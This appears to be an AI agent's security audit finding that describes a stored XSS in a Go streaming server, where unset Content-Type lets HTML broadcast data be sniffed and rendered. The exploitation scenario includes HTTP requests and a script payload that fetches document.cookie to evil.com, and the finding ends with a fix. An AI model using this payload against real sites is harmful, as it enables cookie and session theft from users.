---
agent_num: 1
provider: claude
---

## Vulnerability: Stored XSS via Content-Type Sniffing on `/station/listen`

### Vulnerable Code Location

**`main.go:92-101`** (subscribe handler) combined with **`broadcaster.go:69-73`** (Broadcaster history storage)

```go
// main.go:92-101 — data written to HTTP response with no Content-Type set
cursor := 0
for {
    data, ok := b.Read(r.Context(), &cursor)
    if !ok {
        return
    }
    if _, err := w.Write(data); err != nil { // ← Content-Type auto-detected here
        return
    }
    flusher.Flush()
}
```

### Explanation

The `subscribe` handler writes broadcast data directly to the `http.ResponseWriter` without ever setting a `Content-Type` header. Go's `ResponseWriter.Write()` triggers `http.DetectContentType()` on the first 512 bytes, implementing the [WHATWG MIME sniffing algorithm](https://mimesniff.spec.whatwg.org/). If the first chunk of broadcast data contains HTML signatures (e.g., `<script>`, `<html>`, `<iframe>`), Go sets `Content-Type: text/html; charset=utf-8`, causing browsers to render and execute the content as a web page.

The Station Manager's `Broadcaster` stores all broadcast data in an unbounded history buffer (`broadcaster.go:72-73`). Every new listener starts at `cursor=0` and replays the full history. This makes the XSS **stored** — the malicious payload persists across listener sessions for the lifetime of the station.

### Exploitation Scenario

1. **Attacker creates a station:**
   ```
   POST /station?id=free-music
   ```

2. **Attacker broadcasts an XSS payload as the first message:**
   ```
   POST /station/broadcast?id=free-music
   Content-Type: application/octet-stream
   
   <html><script>fetch('https://evil.com/steal?cookie='+document.cookie)</script></html>
   ```
   This is stored in `b.history[0]`.

3. **Victim visits the listen URL in their browser:**
   ```
   GET /station/listen?id=free-music
   ```

4. The subscribe handler calls `w.Write(data)` with the HTML payload as the first write. Go's `DetectContentType` matches the `<html>` signature and sets `Content-Type: text/html; charset=utf-8`.

5. The browser renders the response as HTML and **executes the attacker's JavaScript** in the victim's browsing context. If this server shares an origin with other applications (behind a reverse proxy, on a shared domain), the script can steal cookies, session tokens, or perform actions as the victim.

6. **Every subsequent listener** who connects to station `free-music` triggers the same XSS — the payload is replayed from `b.history[0]` at `cursor=0`.

### What the Attacker Gains

- JavaScript execution in every listener's browser session
- Cookie/session theft if the server shares an origin with authenticated applications
- Phishing via convincing HTML pages served from the trusted server origin
- Browser-based attacks (keylogging, credential harvesting, redirect to malicious sites)

### Severity: **High**

Per the definitions: *"Stored XSS that executes in other users' sessions."* The payload is stored in the Broadcaster's history buffer, persists for the station's lifetime, and executes in every new listener's browser automatically — no crafted URL or user interaction required beyond visiting the legitimate listen endpoint.

### Fix

Set an explicit `Content-Type` header before the first write in the subscribe handler to prevent MIME sniffing:

```go
w.Header().Set("Content-Type", "application/octet-stream")
w.Header().Set("X-Content-Type-Options", "nosniff")
```
